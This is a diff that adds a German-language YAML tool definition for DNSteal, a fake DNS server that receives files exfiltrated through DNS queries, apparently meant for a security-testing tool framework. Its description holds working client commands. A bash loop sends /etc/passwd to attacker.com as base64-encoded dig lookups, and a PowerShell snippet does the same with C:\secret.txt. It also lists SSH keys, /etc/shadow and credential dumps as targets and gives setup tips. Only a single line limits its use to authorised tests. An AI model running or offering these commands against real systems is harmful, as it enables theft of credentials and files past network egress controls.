@@ -1,0 +1,93 @@
+name: "dnsteal"
+command: "python3"
+args:
+  - "/opt/dnsteal/dnsteal.py"
+enabled: true
+short_description: "DNSteal – Datei-Exfiltration via DNS-Queries (fake DNS-Server)"
+description: |
+  DNSteal ist ein einfacher Fake-DNS-Server, der Dateien über DNS-Queries empfängt.
+  Ideal für Szenarien, wo nur DNS-Traffic nach außen erlaubt ist.
+  Das Skript auf dem Zielsystem kodiert Dateiinhalte in DNS-Hostnamen.
+
+  **Funktionsweise:**
+  1. DNSteal-Server auf Angreifer-Seite starten (lauscht auf Port 53)
+  2. Auf Zielsystem Datei in DNS-Queries aufteilen und senden
+  3. Server rekonstruiert die Datei aus den empfangenen DNS-Queries
+
+  **Server starten (Angreifer):**
+  ```bash
+  # Basis-Modus
+  python3 dnsteal.py attacker.com
+
+  # Mit Verbose-Output
+  python3 dnsteal.py attacker.com -v
+
+  # Multi-File-Modus
+  python3 dnsteal.py attacker.com -m
+
+  # Eigener Port
+  python3 dnsteal.py attacker.com -p 5353
+  ```
+
+  **Client (auf Zielsystem – Linux):**
+  ```bash
+  # Datei exfiltrieren
+  while read line; do
+    dig $(echo -n "$line" | base64 | tr -d '=' | fold -w 60 | awk '{print $1"."}' | tr -d '\n')attacker.com @attacker.com +short
+    sleep 0.1
+  done < /etc/passwd
+
+  # Mit automatisiertem Tool
+  python3 send.py /etc/passwd attacker.com
+  ```
+
+  **Client (Windows PowerShell):**
+  ```powershell
+  # Datei in DNS-Queries kodieren
+  $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secret.txt"))
+  $chunks = $data -split "(?<=\G.{60})"
+  foreach($chunk in $chunks) {
+    Resolve-DnsName "$chunk.attacker.com" -ErrorAction SilentlyContinue
+    Start-Sleep -m 100
+  }
+  ```
+
+  **Erkannte Exfiltrations-Szenarien:**
+  - Passwort-Dateien (/etc/passwd, /etc/shadow)
+  - SSH-Schlüssel und Zertifikate
+  - Konfigurationsdateien
+  - Kleine Credential-Dumps
+
+  **Hinweise:**
+  - Port 53 benötigt Root-Rechte
+  - Langsamer als HTTP-Exfiltration (DNS-Limits)
+  - NS-Record für Domain auf Angreifer-IP empfohlen
+  - Nur für autorisierte Sicherheitstests
+parameters:
+  - name: "domain"
+    type: "string"
+    description: "Domain für DNS-Exfiltration (z.B. attacker.com)"
+    required: true
+    position: 0
+    format: "positional"
+  - name: "verbose"
+    type: "bool"
+    description: "Verbose-Ausgabe aktivieren"
+    required: false
+    default: false
+    flag: "-v"
+    format: "flag"
+  - name: "port"
+    type: "int"
+    description: "DNS-Port (Standard: 53, alternativer Port: 5353)"
+    required: false
+    default: 53
+    flag: "-p"
+    format: "flag"
+  - name: "multi"
+    type: "bool"
+    description: "Multi-File-Modus aktivieren"
+    required: false
+    default: false
+    flag: "-m"
+    format: "flag"
